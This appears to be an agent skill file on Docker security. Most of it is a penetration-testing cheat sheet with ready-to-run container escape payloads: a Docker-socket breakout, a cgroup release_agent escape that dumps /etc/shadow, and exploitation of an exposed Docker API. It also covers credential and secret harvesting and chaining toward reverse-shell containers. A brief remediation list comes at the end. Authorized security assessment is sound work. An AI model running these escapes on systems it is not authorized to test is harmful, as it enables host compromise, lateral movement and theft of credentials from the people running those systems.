---
name: docker
description: Docker container security assessment and escape techniques
---

# Docker Security

## Attack Surface

- Exposed Docker socket (`/var/run/docker.sock`) accessible from within containers
- Containers running in `--privileged` mode with full host capabilities
- Sensitive host directories mounted into containers (`/`, `/etc`, `/root`)
- Outdated or vulnerable base images with known CVEs
- Docker daemon API exposed on network without TLS or authentication
- Secrets passed via environment variables instead of Docker secrets
- Default bridge networking allowing inter-container traffic
- Writable Docker socket mounted for CI/CD pipelines

## Detection Techniques

- Check if running inside a container: `/.dockerenv` existence, cgroup checks
- Enumerate capabilities: `capsh --print` or `cat /proc/self/status | grep Cap`
- Detect mounted Docker socket: `ls -la /var/run/docker.sock`
- Scan for exposed Docker API: `curl http://target:2375/version`
- Check for privileged mode: `ip link add dummy0 type dummy` (succeeds if privileged)
- Inspect mounted volumes: `cat /proc/self/mountinfo`
- Search for secrets in environment: `env | grep -iE "pass|secret|key|token"`
- Identify host PID namespace sharing: `ps aux` showing host processes

## Common Payloads

### Docker Socket Escape
```bash
# If /var/run/docker.sock is mounted, spawn a privileged container with host root
curl -s --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/containers/create" \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["sh"],"Binds":["/:/hostfs"],"Privileged":true}'

# Or use the Docker CLI directly
docker -H unix:///var/run/docker.sock run -v /:/hostfs -it alpine chroot /hostfs
```

### Privileged Container Escape
```bash
# Mount host filesystem via device access
mkdir /tmp/hostfs
mount /dev/sda1 /tmp/hostfs
cat /tmp/hostfs/etc/shadow

# cgroup release_agent escape (CVE-2022-0492 pattern)
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p $d/w
echo 1 > $d/w/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > $d/release_agent
echo "#!/bin/sh" > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod +x /cmd
sh -c "echo 0 > $d/w/cgroup.procs"
cat /output
```

### Remote Docker API Exploitation
```bash
# List all containers on exposed API
curl http://target:2375/containers/json?all=1

# Create a container mounting the host root
curl -X POST http://target:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["cat","/hostfs/etc/shadow"],"Binds":["/:/hostfs"]}'

# Start and read logs
curl -X POST http://target:2375/containers/<id>/start
curl http://target:2375/containers/<id>/logs?stdout=true
```

### Sensitive File Discovery
```bash
# Docker secrets locations
cat /run/secrets/*
cat /proc/1/environ | tr '\0' '\n'
find / -name "*.env" -o -name "docker-compose*" 2>/dev/null
```

## Bypass Techniques

- Use `--pid=host` to access host process memory via `/proc/<pid>/root`
- Exploit `CAP_SYS_ADMIN` to remount filesystems or use `nsenter`
- Leverage `CAP_NET_ADMIN` to sniff inter-container traffic
- Abuse writable `/proc/sysrq-trigger` for host kernel actions in privileged mode
- Use `nsenter --target 1 --mount --uts --ipc --net --pid` to enter host namespaces

## Exploit Chaining

- Docker socket access + image pull: deploy attacker-controlled image as privileged container
- Container escape + credential harvest: read host `/root/.ssh/`, `/root/.aws/credentials`
- Exposed Docker API + lateral movement: deploy reverse shell containers across the swarm
- Volume mount + secret theft: access mounted cloud credential files or service account tokens

## Remediation

- Never mount Docker socket into containers; use Docker-in-Docker alternatives
- Run containers as non-root with `USER` directive and `--read-only` filesystem
- Drop all capabilities and add back only what is needed: `--cap-drop=ALL --cap-add=NET_BIND_SERVICE`
- Enable Docker Content Trust for image signature verification
- Use network policies to isolate containers; avoid default bridge network
- Bind Docker daemon API to localhost only; require TLS mutual authentication
- Scan images with Trivy or Grype before deployment
- Use Docker secrets or external vaults instead of environment variables for sensitive data
